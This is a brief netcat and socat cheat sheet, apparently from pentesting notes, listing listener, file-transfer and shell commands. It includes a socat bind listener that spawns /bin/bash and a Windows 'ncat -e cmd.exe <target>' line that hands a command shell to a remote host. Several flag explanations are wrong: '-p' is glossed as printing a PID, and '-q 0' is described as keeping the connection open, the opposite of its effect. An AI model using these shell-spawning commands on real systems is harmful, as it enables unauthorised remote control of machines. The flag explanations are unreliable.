# Netcat

```bash
# Listener — verbose, listen, numeric port, print PID
nc -lvnp 4444
nc -nvlp 4444 -s <your_ip>            # bind a specific address

# Listener that spawns a shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Listener that stays open after the client disconnects (openbsd nc)
nc -lvnp 4444 -q 0

# Send a file
nc -lvnp 4444 > received.bin          # receiver
nc <target> 4444 < file.bin            # sender
```

Notes:
- `-l` listen, `-p` port, `-n` no DNS, `-v` verbose, `-e` exec. OpenBSD netcat has no `-e`; use `ncat --exec` or `socat`.
- `-q 0` stops nc from quitting immediately when the peer closes stdin.
- On Windows use `ncat -e cmd.exe <target> 4444`.
